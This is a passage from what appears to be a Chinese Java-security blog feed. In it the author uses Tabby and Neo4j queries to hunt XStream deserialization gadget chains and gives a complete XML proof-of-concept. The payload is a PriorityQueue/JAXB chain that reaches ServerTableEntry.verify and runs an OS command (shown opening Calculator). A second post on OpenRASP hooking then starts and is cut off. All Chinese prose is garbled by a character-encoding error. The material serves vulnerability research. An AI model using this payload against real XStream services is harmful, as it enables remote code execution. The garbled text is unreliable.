(com.sun.xml.internal.ws.encoding.xml)</span><br><span class="line">getAttachments:465, XMLMessage$XMLMultiPart (com.sun.xml.internal.ws.encoding.xml)</span><br><span class="line">getAttachments:103, MessageWrapper (com.sun.xml.internal.ws.api.message)</span><br><span class="line">get:111, ResponseContext (com.sun.xml.internal.ws.client)</span><br><span class="line">compareIndices:2492, DataTransferer$IndexedComparator (sun.awt.datatransfer)</span><br><span class="line">compare:2971, DataTransferer$IndexOrderComparator (sun.awt.datatransfer)</span><br><span class="line">siftDownUsingComparator:722, PriorityQueue (java.util)</span><br><span class="line">siftDown:688, PriorityQueue (java.util)</span><br><span class="line">heapify:737, PriorityQueue (java.util)</span><br><span class="line">readObject:797, PriorityQueue (java.util)</span><br></pre></td></tr></table></figure><h4 id="å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾1"><a href="#å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾1" class="headerlink" title="å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾1"></a>å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;m0d9 xstream Runtime.exec</span><br><span class="line">match path&#x3D;(m1:Method&#123;NAME:&quot;exec&quot;,CLASSNAME:&quot;java.lang.Runtime&quot;&#125;)&lt;-[r:CALL]-(m2:Method) </span><br><span class="line">return path</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-162.png" alt="upload successful"><br>å¦‚å›¾ï¼Œcom.sun.corba.se.impl.activation.ServerTableEntry#verify</p><p>å°è¯•å¯»æ‰¾Trigger</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;compare&quot;,&quot;hashCode&quot;,&quot;equals&quot;,&quot;compareTo&quot;,&quot;toString&quot;]</span><br><span class="line">match (m1:Method) where m1.NAME&#x3D;&quot;verify&quot; and m1.CLASSNAME&#x3D;&quot;com.sun.corba.se.impl.activation.ServerTableEntry&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;,13) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æ— æœï¼Œæ— æ³•ç›´æ¥ä¸²è”</p><h4 id="å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾2"><a href="#å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾2" class="headerlink" title="å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾2"></a>å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾2</h4><p>æœ‰ä¸€ç§æ ¸å¿ƒä¸­é—´é“¾ï¼Œproxyç±»ï¼Œå­˜åœ¨invokeï¼Œä¸”methodã€objå¯æ§çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; invoke</span><br><span class="line">match path&#x3D;(sink:Method &#123;IS_SINK:true, NAME:&quot;invoke&quot;&#125;)&lt;-[:CALL]-(m1:Method) return m1.CLASSNAME,m1.NAME,m1.PARAMETERS</span><br><span class="line">order by m1.CLASSNAME</span><br></pre></td></tr></table></figure><p>éƒ½è¿‡ä¸€éï¼Œå¯ä»¥å¾—å‡ºç±»ä¼¼ä»¥ä¸‹å¯æ§çš„ç±»</p><p><img src="/images/pasted-163.png" alt="upload successful"></p><h4 id="å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾3"><a href="#å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾3" class="headerlink" title="å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾3"></a>å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾3</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;compare&quot;]</span><br><span class="line">match (m1:Method) where m1.NAME&#x3D;&quot;get&quot; and m1.CLASSNAME&#x3D;&quot;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;,16) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-166.png" alt="upload successful"></p><h4 id="å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾4"><a href="#å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾4" class="headerlink" title="å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾4"></a>å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾4</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;compare&quot;]</span><br><span class="line">match (m1:Method) where m1.NAME&#x3D;&quot;marshal&quot; and m1.CLASSNAME&#x3D;&quot;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;,12) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-167.png" alt="upload successful"></p><h4 id="å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾4-1"><a href="#å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾4-1" class="headerlink" title="å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾4"></a>å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾4</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;compare&quot;]</span><br><span class="line">match (m1:Method) where m1.NAME&#x3D;&quot;getInputStream&quot; and m1.CLASSNAME&#x3D;&quot;com.sun.xml.internal.ws.message.JAXBAttachment&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;,12) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-168.png" alt="upload successful"></p><h4 id="å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾5"><a href="#å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾5" class="headerlink" title="å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾5"></a>å¯»æ‰¾æ ¸å¿ƒä¸­é—´é“¾5</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;get&quot;] </span><br><span class="line">match (m1:Method) where m1.NAME&#x3D;&quot;getInputStream&quot; and m1.CLASSNAME&#x3D;&quot;com.sun.xml.internal.ws.message.JAXBAttachment&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;,5) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-169.png" alt="upload successful"></p><h4 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h4><p>åŸç†åŠåˆ†æå¯ä»¥çœ‹ä¸Šä¸€ç¯‡</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">indexMap</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">packet</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">bi</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">jaxbType</span>&gt;</span>com.sun.corba.se.impl.activation.ServerTableEntry<span class="tag">&lt;/<span class="name">jaxbType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">uriProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">attributeProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">inheritedAttWildcard</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">getter</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.corba.se.impl.activation.ServerTableEntry<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">name</span>&gt;</span>verify<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">getter</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">inheritedAttWildcard</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">bi</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tagName</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">context</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">marshallerPool</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">marshallerPool</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">nameList</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>true<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">localNames</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">localNames</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">nameList</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">jaxbObject</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.corba.se.impl.activation.ServerTableEntry&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">activationCmd</span>&gt;</span>open /Applications/Calculator.app<span class="tag">&lt;/<span class="name">activationCmd</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">jaxbObject</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">satellites</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">invocationProperties</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">packet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">indexMap</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">comparator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æœ¬æ–‡ä»GadgetæŒ–æ˜è§’åº¦ï¼Œä½¿ç”¨tabbyå¤ç°äº†å‡ ä¸ªGadgetçš„æŒ–æ˜è¿‡ç¨‹ï¼Œssrfçš„2ä¸ªé“¾å¾ˆç®€å•ï¼Œrceæœ‰äº›ä¸ªæ¯”è¾ƒå¤æ‚ï¼Œæœ€çŸ­è·¯å¾„ç®—æ³•ä¸èƒ½ç›´æ¥ä¸²èµ·ã€‚è¿™äº›ä¸ªé“¾çš„é‡ç‚¹åœ¨äºä¸­é—´æ ¸å¿ƒé“¾è·¯çš„ç»„è£…ï¼Œæœ¬èœğŸ”ä¹Ÿåªèƒ½å€’æ¨å‡ºéƒ¨åˆ†èŠ‚ç‚¹ï¼Œè¿˜æœ‰ä¸€äº›å…³é”®è½¬æŠ˜ç‚¹å¦‚æœåœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹è‡ªå·±æ¥ï¼Œå¤§æ¦‚ç‡æ˜¯å‘ç°ä¸äº†çš„ã€‚</p><p>å…¶ä»–æ€è€ƒ&amp;æ€»ç»“</p><ol><li>apoc.algo.allSimplePaths æ˜¯æœ€çŸ­è·¯å¾„ï¼Œæœ‰æœ€çŸ­å°±ä¸ä¼šåˆ—å‡ºå…¶ä»–çš„ï¼Œè€Œæœ€çŸ­çš„ä¸ä¸€å®šæ˜¯æœ‰æ•ˆçš„ï¼Œå¯¼è‡´å¯èƒ½ä¼šæ¼ï¼ˆä¹Ÿå¯ä»¥æ­é…[r:CALL|ALIAS*5..8]ä½¿ç”¨ï¼‰ã€‚</li><li>ä¸­é—´æ ¸å¿ƒé“¾è·¯çš„ç»„è£…ï¼Œå› ä¸ºinvokeç­‰ä¸èƒ½è‡ªåŠ¨ä¸²èµ·ï¼Œéœ€è¦ç§¯ç´¯ã€‚</li><li>21342ã€21345 å¯ä»¥çœ‹å‡ºè¿˜æœ‰å…¶ä»–çš„è·¯å¾„ï¼Œæ˜¯å¦ä¹Ÿå¯è¡Œï¼Ÿï¼ˆç­‰æœ‰ç²¾åŠ›å†éªŒè¯ä¸‹å§ğŸ˜“ï¼‰</li></ol><p>æœ€åå†æ¬¡æ„Ÿè°¢wh1t3p1gå¸ˆå‚…ï¼Œç”¨tabbyæ··äº†ä¸ªcveï¼Œä¹Ÿé€†å‘å¤ç°äº†è¿™äº›Gadgetsçš„æŒ–æ˜æ€è·¯ã€‚</p><p>1.4.17æ–°å‡ºé‚£äº›å…¶ä»–çš„Gadgetsï¼Œè¿˜æ²¡ç©ºåˆ†æå¦‚ä½•æ‰¾åˆ°é“¾çš„ï¼Œç­‰æœ‰ç²¾åŠ›å†æ°´ä¸€èŠ‚å§ã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li>[1] <a href="https://github.com/wh1t3p1g/tabby/wiki/%E7%8E%B0%E6%9C%89%E5%88%A9%E7%94%A8%E9%93%BE%E8%A6%86%E7%9B%96">tabby-ç°æœ‰åˆ©ç”¨é“¾è¦†ç›–</a></li><li>[2] <a href="https://blog.0kami.cn/2021/03/14/java-how-to-find-gadget-chains/">å¦‚ä½•é«˜æ•ˆçš„æŒ–æ˜Javaååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼Ÿ</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;æœˆåº•åœ¨å³ï¼Œå†ä¸å†™ç‚¹ä¸œè¥¿ï¼Œæ¯æœˆä¸€ç¯‡éƒ½è¦é£Ÿè¨€äº†ã€‚ä¸Šä¸ªæœˆåˆšæŒ–çš„OpenRASPçš„å‘ï¼Œæœ¬æ‰“ç®—å†ç ”ç©¶ç ”ç©¶ç»•è¿‡å§¿åŠ¿ï¼ŒéªŒè¯ä¸‹çŒœæƒ³ï¼Œä¹Ÿæ²¡ä¸‹æ–‡ã€‚æ­£å¥½6æœˆä»½äº¤çš„XStream SSRF Gadget CVEä¸‹æ¥ï¼Œä¹‹å‰XStreamç³»åˆ—è‰ç¨¿ç®±é‡Œä¹Ÿå¾…ç€ä¹‹å‰é€†å‘åˆ†æå¸ˆå‚…ä»¬æŒ–æ˜çš„æ€è·¯&amp;amp;æ‰‹æ³•ï¼Œæ­£å¥½ç¼–è¾‘ç¼–è¾‘ï¼Œæ°´ä¸€ç¯‡â€å¦‚ä½•æŒ–æ˜XStream Gadgetsâ€ã€‚&lt;/p&gt;
&lt;p&gt;é¦–å…ˆæ„Ÿè°¢Wh1t3p1gå¸ˆå‚…çš„Tabbyï¼Œç”¨èµ·æ¥æ¯”gadgetinspectoræ›´é¡ºæ‰‹ï¼Œæ‰¾é“¾ç¥å™¨ã€‚&lt;/p&gt;
&lt;h2 id=&quot;Tabby&quot;&gt;&lt;a href=&quot;#Tabby&quot; class=&quot;headerlink&quot; title=&quot;Tabby&quot;&gt;&lt;/a&gt;Tabby&lt;/h2&gt;&lt;p&gt;æœ‰å…³Tabbyçš„ä»‹ç»ï¼Œè¯¦æƒ…å¯ä»¥å‚è€ƒã€1ã€‘ä¸­Wh1t3p1gå¸ˆå‚…çš„å‡ ä¸ªwikiï¼Œå†™çš„å¾ˆè¯¦ç»†äº†ï¼Œè¿™é‡Œä¹Ÿä¸å¤šå•°å—¦ã€‚ï¼ˆè¿™é‡Œè†œä¸€ä¸‹Wh1t3p1gå¸ˆå‚…ï¼‰&lt;/p&gt;
&lt;p&gt;Neo4j æŸ¥è¯¢æ¯”è¾ƒåƒcpuï¼Œå°æœ¬æœ¬åŠ ä¸ŠideaåŒæ—¶è·‘åƒåŠ›ï¼Œæå°vpsè·‘æ¯”è¾ƒå¥½ï¼Œä½†æ˜¯tabbyæ˜¯é€šè¿‡apoc.load.csv fileå†™Neo4jæ•°æ®çš„ï¼Œç›¸å½“äºé™åˆ¶äº†æœ¬æœºï¼Œå› æ­¤ç»™ä¸‹æ•´åº“çš„dumpå’Œloadï¼ˆå½“ç„¶ï¼Œç›´æ¥æ•´ä¸ªåœ¨vpsä¸Šæ“ä½œä¹Ÿæ˜¯okçš„ï¼‰ã€‚&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# dump neo4j database&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;neo4j-admin dump --to /tmp/neo4j.dump --database neo4j&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# scp dump file to vps&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# load neo4j dump file&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;./bin/neo4j stop&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;./bin/neo4j-admin load --from=/root/neo4j.dump --database=neo4j --force&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;./bin/neo4j start&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Gadget" scheme="http://m0d9.me/tags/Gadget/"/>
    
    <category term="Tabby" scheme="http://m0d9.me/tags/Tabby/"/>
    
    <category term="XStream" scheme="http://m0d9.me/tags/XStream/"/>
    
  </entry>
  
  <entry>
    <title>OpenRASPå­¦ä¹ ç¬”è®°ï¼ˆä¸€ï¼‰</title>
    <link href="http://m0d9.me/2021/07/13/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://m0d9.me/2021/07/13/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2021-07-13T10:23:00.000Z</published>
    <updated>2021-07-18T13:34:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>RASPï¼ˆRuntime Application self-protectionï¼‰æŠ€æœ¯è‡ªGartneråœ¨2014å¹´æå‡ºï¼Œå·²ç»æœ‰æŒºé•¿ä¸€æ®µæ—¶é—´äº†ã€‚å¤§å‚ä»¬ç°åœ¨åŸºæœ¬ä¹Ÿéƒ½æœ‰è‡ªç ”çš„RASPã€IASTäº§å“ã€‚åœ¨å¼€æºRASPä¸­ï¼Œåº”ä»¥OpenRASPèµ·æ­¥æœ€æ—©ï¼Œåº”ç”¨ä¹Ÿæœ€å¹¿ã€‚ä¸è¿‡å› ä¸ºæ€§èƒ½åŸå› ï¼Œåœ¨å®é™…æ”»é˜²ä¸­è¦†ç›–é¢è¿˜æ˜¯æœ‰é™ã€‚</p><p>RASPç®—æ˜¯Javaå®‰å…¨ç»•ä¸å¼€çš„ä¸€ä¸ªæŠ€æœ¯ç‚¹ï¼Œæœ‰å…´è¶£å¯¹æ­¤å­¦ä¹ ç ”ç©¶ä¸€ç•ªã€‚å‚è€ƒæ–‡ç« ä¸­threedr3amã€tr1pleã€c0d3p1ut0så‡ ä¸ªå¸ˆå‚…ä»¬å¯¹äºOpenRASPçš„åŸç†ã€æŠ€æœ¯ç‚¹éƒ½æœ‰è·Ÿè¸ªå’Œè§£é‡Šï¼Œå› æ­¤æœ¬æ–‡ä¸å†å¤šåšç±»ä¼¼çš„é˜é‡Šï¼Œä¸»è¦é’ˆå¯¹è‡ªå·±çš„ä¸€äº›çŸ¥è¯†ç›²ç‚¹ã€å…´è¶£ç‚¹ï¼Œåšåšç ”ç©¶ä¸ç¬”è®°ã€‚</p><h2 id="OpenRASPçš„Hook"><a href="#OpenRASPçš„Hook" class="headerlink" title="OpenRASPçš„Hook"></a>OpenRASPçš„Hook</h2><p>å…³æ³¨ä¸¤ç‚¹ï¼š</p><ol><li>å¦‚ä½•Hookçš„</li><li>Hookäº†å“ªäº›ç±»çš„å“ªäº›æ–¹æ³•</li></ol><h3 id="å¦‚ä½•Hook"><a href="#å¦‚ä½•Hook" class="headerlink" title="å¦‚ä½•Hook"></a>å¦‚ä½•Hook</h3><a id="more"></a><p>å®˜æ–¹æ–‡æ¡£å·²ç»æè¿°çš„å¾ˆè¯¦ç»†äº†<br><img src="/images/pasted-147.png" alt="upload successful"></p><p>æ³¨æ„æ­¥éª¤2 Retransfromï¼Œç¬¬ä¸€æ¬¡é‡åˆ°</p><h4 id="Instrumentation"><a href="#Instrumentation" class="headerlink" title="Instrumentation"></a>Instrumentation</h4><p>Java Instrumentation APiæ”¯æŒå¯åŠ¨æ—¶/è¿è¡Œæ—¶Attach Agentï¼Œå…·ä½“çœ‹ä¸ªç®€å•ä¾‹å­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentMainTest</span> </span>&#123;</span><br><span class="line"><span class="comment">//    public static void agentmain(String agentArgs, Instrumentation instrumentation) &#123;</span></span><br><span class="line"><span class="comment">//        instrumentation.addTransformer(new DefineTransformer(), true);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String agentArgs, Instrumentation instrumentation)</span> </span>&#123;</span><br><span class="line">        instrumentation.addTransformer(<span class="keyword">new</span> DefineTransformer(), <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">DefineTransformer</span> <span class="keyword">implements</span> <span 